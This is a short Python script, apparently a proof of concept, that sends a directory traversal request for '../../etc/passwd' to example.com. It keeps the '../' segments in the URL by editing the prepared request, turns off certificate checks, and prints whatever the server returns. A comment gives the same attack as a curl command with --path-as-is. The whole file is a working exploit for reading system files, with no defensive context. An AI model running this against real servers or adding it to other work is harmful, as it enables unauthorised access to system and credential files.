import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# curl  --path-as-is -X GET http://example.com/../../etc/passwd
url = 'http://example.com/'
url = url + '../../etc/passwd'

s = requests.session()
req = requests.Request(method='GET', url=url)
prep = req.prepare()
prep.url = url

r = s.send(prep, verify=False)

print(r.text)